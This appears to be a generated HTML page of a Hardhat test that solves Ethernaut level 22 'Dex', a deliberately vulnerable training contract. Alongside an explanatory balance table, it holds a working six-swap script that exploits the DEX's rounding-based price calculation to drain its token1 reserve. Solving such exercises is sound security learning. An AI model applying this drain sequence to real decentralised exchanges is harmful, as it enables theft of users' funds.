@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 22: Dex</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 22: Dex</h1>
+
+        
+      </div>
+      
+        
+        
+        <div class='highlight'><pre><span class="hljs-keyword">import</span> {ethers} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;hardhat&#x27;</span>
+<span class="hljs-keyword">import</span> {<span class="hljs-title class_">Contract</span>, providers, <span class="hljs-title class_">Signer</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;ethers&#x27;</span>
+
+<span class="hljs-keyword">import</span> {<span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>, expect, expectStatusOK} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./testUtil&#x27;</span>
+
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LEVEL_ADDRESS</span> = <span class="hljs-string">&#x27;0x0b0276F85EF92432fBd6529E169D9dE4aD337b1F&#x27;</span>
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">INSTANCE_ADDRESS</span> = <span class="hljs-string">&#x27;0xf65D135ca65088ad0dc1ca91033f5295b7C8d76e&#x27;</span>
+
+<span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;22 Dex&#x27;</span>, <span class="hljs-function">() =&gt;</span> {
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">ethernaut</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signer</span>: <span class="hljs-title class_">Signer</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signerAddress</span>: <span class="hljs-built_in">string</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">provider</span>: providers.<span class="hljs-property">Provider</span>
+
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">_1</span>: <span class="hljs-built_in">string</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">_2</span>: <span class="hljs-built_in">string</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">token1</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">token2</span>: <span class="hljs-title class_">Contract</span>
+
+  <span class="hljs-title function_">before</span>(<span class="hljs-keyword">async</span> () =&gt; {
+    ethernaut = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Ethernaut&#x27;</span>, <span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>)
+    instance = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Dex&#x27;</span>, <span class="hljs-variable constant_">INSTANCE_ADDRESS</span>)
+
+    _1 = <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">token1</span>()
+    _2 = <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">token2</span>()
+
+    token1 = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;SwappableToken&#x27;</span>, _1)
+    token2 = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;SwappableToken&#x27;</span>, _2)
+
+    <span class="hljs-keyword">const</span> signers = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getSigners</span>()
+    signer = signers[<span class="hljs-number">0</span>]
+    signerAddress = <span class="hljs-keyword">await</span> signer.<span class="hljs-title function_">getAddress</span>()
+    provider = signer.<span class="hljs-property">provider</span>
+  })</pre></div>
+      
+        
+        <p>Approve <code>Dex</code> instance for transferring our tokens.</p>
+
+        <div class='highlight'><pre>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&quot;approves instance for signer&#x27;s tokens&quot;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">approve</span>(instance.<span class="hljs-property">address</span>, <span class="hljs-number">1000000</span>, {<span class="hljs-attr">gasLimit</span>: <span class="hljs-number">100000</span>})
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expectStatusOK</span>(tx)
+  })</pre></div>
+      
+        
+        <p>The instance’s balance of one token can be nulled by swapping tokens back and forth,
+making the ‘from’ token cheaper each time, so we can buy it back at a cheaper rate
+in the subsequent swap. In the first five swaps, we always exchange our entire balance
+of the ‘from’ token. In the last swap, we exchange the exact amount needed to take out
+the instance’s remaining balance of the token we are nulling.</p>
+
+        <div class='highlight'><pre><span class="hljs-comment">/*
+This is the sequence of balances and swaps:
+| Dex: Token 1 | Dex: Token 2 | Player: Token 1 | Player: Token 2 | Swap                 |
+|--------------|--------------|-----------------|-----------------|----------------------|
+| 100          | 100          | 10              | 10              | Get  10 T2 for 10 T1 |
+| 110          | 90           | 0               | 20              | Get  24 T1 for 20 T2 |
+| 86           | 110          | 24              | 0               | Get  30 T2 for 24 T1 |
+| 110          | 80           | 0               | 30              | Get  41 T1 for 30 T2 |
+| 69           | 110          | 41              | 0               | Get  65 T2 for 41 T1 |
+| 110          | 45           | 0               | 65              | Get 110 T1 for 45 T2 |
+| 0            | 90           | 110             | 20              | Nulled.              |
+
+Plugging the Dex balances before the last swap into &#x27;get_swap_price&#x27;:
+    floor( amount * 110 / 45 ) = 110  ==&gt;  amount = 45
+*/</span>
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&quot;nulls instance&#x27;s balance of token1 in six swaps&quot;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> swap = <span class="hljs-keyword">async</span> (<span class="hljs-attr">_from</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">_to</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">amount</span>: <span class="hljs-built_in">number</span>) =&gt; {
+      process.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">`Buy T<span class="hljs-subst">${_to}</span> for <span class="hljs-subst">${amount}</span> of T<span class="hljs-subst">${_from}</span>... ◉\r`</span>)
+      <span class="hljs-keyword">const</span> tokenAddr = [<span class="hljs-number">0</span>, _1, _2]
+      <span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">swap</span>(tokenAddr[_from], tokenAddr[_to], amount, {<span class="hljs-attr">gasLimit</span>: <span class="hljs-number">500000</span>})
+      <span class="hljs-keyword">const</span> rcpt = <span class="hljs-keyword">await</span> tx.<span class="hljs-title function_">wait</span>()
+      <span class="hljs-title function_">expect</span>(rcpt.<span class="hljs-property">status</span>).<span class="hljs-property">to</span>.<span class="hljs-title function_">eq</span>(<span class="hljs-number">1</span>)
+      process.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">`Buy T<span class="hljs-subst">${_to}</span> for <span class="hljs-subst">${amount}</span> of T<span class="hljs-subst">${_from}</span>... ✔\n`</span>)
+    }
+    <span class="hljs-keyword">await</span> <span class="hljs-title function_">swap</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">10</span>)
+    <span class="hljs-keyword">await</span> <span class="hljs-title function_">swap</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">20</span>)
+    <span class="hljs-keyword">await</span> <span class="hljs-title function_">swap</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">24</span>)
+    <span class="hljs-keyword">await</span> <span class="hljs-title function_">swap</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">30</span>)
+    <span class="hljs-keyword">await</span> <span class="hljs-title function_">swap</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">41</span>)
+    <span class="hljs-keyword">await</span> <span class="hljs-title function_">swap</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">45</span>)
+    <span class="hljs-title function_">expect</span>(<span class="hljs-keyword">await</span> token1.<span class="hljs-title function_">balanceOf</span>(instance.<span class="hljs-property">address</span>)).<span class="hljs-property">to</span>.<span class="hljs-title function_">eq</span>(<span class="hljs-number">0</span>)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;is validated&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expect</span>(ethernaut.<span class="hljs-title function_">submitLevelInstance</span>(instance.<span class="hljs-property">address</span>))
+      .<span class="hljs-property">to</span>.<span class="hljs-title function_">emit</span>(ethernaut, <span class="hljs-string">&#x27;LevelCompletedLog&#x27;</span>)
+      .<span class="hljs-title function_">withArgs</span>(signerAddress, <span class="hljs-variable constant_">LEVEL_ADDRESS</span>).<span class="hljs-property">eventually</span>
+  })
+})</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
